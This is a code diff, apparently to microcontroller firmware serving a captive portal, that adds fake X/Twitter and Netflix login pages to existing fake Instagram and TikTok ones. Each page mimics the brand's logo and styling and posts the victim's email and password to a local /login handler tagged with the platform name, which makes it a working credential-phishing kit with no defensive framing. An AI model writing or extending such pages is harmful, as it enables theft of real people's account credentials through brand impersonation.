@@ -47,6 +47,9 @@ h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
 .btn-ig { border-color: #E4405F; }
 .btn-ig .icon { color: #E4405F; }
 .btn-tt { border-color: #000; }
+.btn-tw { border-color: #000; }
+.btn-nf { border-color: #E50914; }
+.btn-nf .icon { color: #E50914; }
 .icon { width: 28px; height: 28px; flex-shrink: 0; }
 .footer { text-align: center; color: #999; font-size: 12px; margin-top: 20px;
           padding-top: 15px; border-top: 1px solid #eee; }
@@ -75,6 +78,14 @@ h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
   <a href="/tt" class="btn btn-tt">
     <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5.8 20.1a6.34 6.34 0 0 0 10.86-4.43v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1-.05z"/></svg>
     <span>Continuar com o TikTok</span>
+  </a>
+  <a href="/tw" class="btn btn-tw">
+    <svg class="icon" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/></svg>
+    <span>Continuar com o X</span>
+  </a>
+  <a href="/nf" class="btn btn-nf">
+    <svg class="icon" viewBox="0 0 24 24" fill="#E50914"><path d="M5.398 0v.006c3.028 8.556 5.37 15.175 8.348 23.596 2.344.058 4.85.398 4.854.398-2.8-7.924-5.923-16.747-8.487-24H5.398zm8.489 0v9.63L18.6 22.951c-.043-7.86-.004-15.72.002-22.95h-4.715zM5.398 1.05V24c1.873-.225 2.81-.312 4.715-.398v-9.22L5.398 1.05z"/></svg>
+    <span>Continuar com a Netflix</span>
   </a>
   <div class="footer">Ao continuar, você aceita as condições do serviço</div>
 </div>
@@ -344,7 +355,7 @@ button:active { background: #e6244a; }
     <svg viewBox="0 0 120 40" height="40"><text x="0" y="30" font-family="Helvetica,Arial,sans-serif" font-size="28" font-weight="900" fill="white">Tik</text><text x="50" y="30" font-family="Helvetica,Arial,sans-serif" font-size="28" font-weight="900" fill="#fe2c55">Tok</text></svg>
   </div>
   <h1>Entrar</h1>
-  <p class="subtitle">Administra tu cuenta y crea contenido increíble</p>
+  <p class="subtitle">Gerencie sua conta e crie conteúdo incrível</p>
   <form action="/login" method="POST">
     <input type="hidden" name="platform" value="TikTok">
     <input type="text" name="email" placeholder="E-mail, usuário ou telefone" required autofocus>
@@ -352,6 +363,95 @@ button:active { background: #e6244a; }
     <button type="submit">Entrar</button>
   </form>
   <a href="#" class="forgot">Esqueceu a senha?</a>
+</div>
+</body>
+</html>)rawliteral";
+
+// ───── X / Twitter (tema escuro, logo oficial) ────────────────────────────
+const char html_twitter[] PROGMEM = R"rawliteral(<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Entrar / X</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+       background: #000; color: #e7e9ea; min-height: 100vh; display: flex;
+       align-items: center; justify-content: center; padding: 20px; }
+.container { width: 100%; max-width: 400px; padding: 30px; background: #000;
+             border-radius: 16px; border: 1px solid #2f3336; }
+.logo { text-align: center; margin-bottom: 24px; }
+.logo svg { width: 34px; height: 34px; fill: #fff; }
+h1 { font-size: 26px; text-align: left; margin-bottom: 26px; font-weight: 800; }
+input { width: 100%; padding: 15px 12px; background: #000; border: 1px solid #333639;
+        color: #fff; border-radius: 6px; margin-bottom: 14px; font-size: 15px;
+        font-family: inherit; }
+input:focus { outline: none; border-color: #1d9bf0; }
+button { width: 100%; padding: 14px; background: #eff3f4; color: #0f1419; border: none;
+         border-radius: 999px; font-size: 16px; font-weight: 700; cursor: pointer;
+         margin-top: 6px; font-family: inherit; }
+button:active { background: #d7dbdc; }
+.forgot { display: block; text-align: center; color: #1d9bf0; font-size: 14px;
+          margin-top: 20px; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">
+    <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.451-6.231zm-1.161 17.52h1.833L7.084 4.126H5.117l11.966 15.644z"/></svg>
+  </div>
+  <h1>Entrar no X</h1>
+  <form action="/login" method="POST">
+    <input type="hidden" name="platform" value="Twitter/X">
+    <input type="text" name="email" placeholder="Telefone, e-mail ou usuário" required autofocus>
+    <input type="password" name="password" placeholder="Senha" required>
+    <button type="submit">Entrar</button>
+  </form>
+  <a href="#" class="forgot">Esqueceu a senha?</a>
+</div>
+</body>
+</html>)rawliteral";
+
+// ───── Netflix (tema escuro, wordmark vermelho) ───────────────────────────
+const char html_netflix[] PROGMEM = R"rawliteral(<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Netflix - Entrar</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+       background: #000; color: #fff; min-height: 100vh; display: flex;
+       align-items: center; justify-content: center; padding: 20px; }
+.container { width: 100%; max-width: 400px; padding: 40px 30px; background: rgba(0,0,0,0.75);
+             border-radius: 6px; }
+.logo { color: #E50914; font-size: 34px; font-weight: 900; letter-spacing: 1px;
+        margin-bottom: 26px; }
+h1 { font-size: 26px; margin-bottom: 22px; font-weight: 700; }
+input { width: 100%; padding: 16px; background: #333; border: none; color: #fff;
+        border-radius: 4px; margin-bottom: 16px; font-size: 15px; font-family: inherit; }
+input:focus { outline: none; background: #454545; }
+button { width: 100%; padding: 15px; background: #E50914; color: #fff; border: none;
+         border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer;
+         margin-top: 6px; font-family: inherit; }
+button:active { background: #b20710; }
+.forgot { display: block; text-align: center; color: #b3b3b3; font-size: 14px;
+          margin-top: 20px; text-decoration: none; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="logo">NETFLIX</div>
+  <h1>Entrar</h1>
+  <form action="/login" method="POST">
+    <input type="hidden" name="platform" value="Netflix">
+    <input type="email" name="email" placeholder="E-mail ou número de telefone" required autofocus>
+    <input type="password" name="password" placeholder="Senha" required>
+    <button type="submit">Entrar</button>
+  </form>
+  <a href="#" class="forgot">Precisa de ajuda?</a>
 </div>
 </body>
 </html>)rawliteral";
